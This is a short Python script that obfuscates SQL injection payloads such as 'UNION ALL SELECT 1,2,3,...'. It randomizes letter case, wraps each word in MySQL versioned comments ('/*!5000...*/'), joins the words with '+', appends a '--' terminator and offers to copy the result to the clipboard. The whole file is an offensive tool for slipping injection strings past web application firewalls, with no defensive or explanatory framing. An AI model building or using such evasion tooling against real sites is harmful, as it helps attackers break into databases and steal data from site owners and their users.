import random
import pyperclip

print("The query must look like something like this: 'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10'")
string = str(input("Enter a string: "))

randomized_string = ""
for char in string:
    if random.random() < 0.5:
        randomized_string += char.upper()
    else:
        randomized_string += char.lower()

words = randomized_string.split()

randomized_string = ""
for word in words:
    randomized_string += "/*!5000" + word + "*/+"

randomized_string += "--"

print(randomized_string)

copy_randomized_string = input("Do you want to copy this string? (Y/n) ")

if copy_randomized_string == "Y" or copy_randomized_string == "y":
    pyperclip.copy(randomized_string)
else:
    exit() 
